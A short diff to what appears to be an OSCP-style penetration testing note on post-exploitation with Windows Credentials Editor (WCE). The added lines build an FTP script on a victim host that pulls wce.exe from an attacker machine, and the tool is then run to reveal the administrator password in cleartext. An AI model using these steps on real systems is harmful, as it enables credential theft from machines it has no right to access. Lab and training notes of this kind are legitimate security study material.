@@ -6,13 +6,20 @@ title: WCE post exploitation
 
 
 
+
 Download wce
 
     cd /opt/
     wget http://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
     unzip wce_v1_41beta_universal.zip -d wce
 
-Upload wce.exe to victim
+**Victim**:  With ftp server running on attacking box.  Upload wce.exe to victim
+    echo open 192.168.30.36> ftp.txt
+    echo your_username>> ftp.txt
+    echo your_password>> ftp.txt
+    echo binary>> ftp.txt
+    echo get wce.exe>> ftp.txt
+    echo bye>> ftp.txt
 
 **Victim**:  Execute wce.  Administrator password displayed in the clear.  (real password masked just in case any potential oscp students are actually reading this)
 
